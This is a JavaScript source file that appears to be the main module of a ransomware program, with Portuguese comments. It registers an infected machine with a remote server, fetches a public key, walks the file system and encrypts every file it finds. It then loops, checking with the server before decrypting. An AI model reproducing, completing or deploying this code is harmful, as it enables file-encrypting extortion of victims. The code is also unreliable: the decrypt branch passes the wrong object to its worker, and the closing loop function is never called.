"use strict";


const Connection = require("./connection");
// classe responsavel de ler as informacoes do compt atual q ta em execucao e devolver os valores
const MachineManager = require("./utils/MachineManager");
const Encrypter = require("./crypto/crypter");
const Decrypter = require("./crypto/decrypter");
const lukeFileWalker = require("./discover");
const worker = require("./worker");


// instancia os modulos
const connection = new Connection();

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))

const waitThenDo= async()  => {
    console.log("Vou nanar :3");
    await sleep(1000 * 5);
    console.log("Nene acoido :3");
};

/// funcao principal ( GIGANTE ACOIDÔ :3 )

async function main() {
    var system = MachineManager.loadId();
    if (!system) {
        console.log("Nao rodou nessa maquina")
        try {    // rodar o cripter
            console.log("Iniciando os jobsons...");
            system = MachineManager.generateID();
            const { publicKey } = await connection.registerMachine(system);
            const fileEncrypter = Encrypter(publicKey);
            // executa a busca dos aqv
            lukeFileWalker(filename => {
                worker(filename, fileEncrypter);
            });
        } catch(error) {
            // servidor off
            MachineManager.deleteId();
        }

    } else {
        console.log("Ja rodou nessa maquina")
        // rodou nessa maquina
        
        try {
            // 

            console.log("Desencriptando...");
            const data  = await connection.checkMachineStatus(system.uuid);
            if (data){
                const fileDecrypter = Decrypter(data);
                lukeFileWalker(filename => {
                    worker(filename, Decrypter)
                })
            }
        } catch(error) {
            // server off
            console.log("Erro ao tentar desencriptar.");
        }
    } // terminou o processamento 
}

(async function(){
    while(true) {
        // invoca o primeiro main e dps vai nanar
        await main();
        await waitThenDo();
    }
})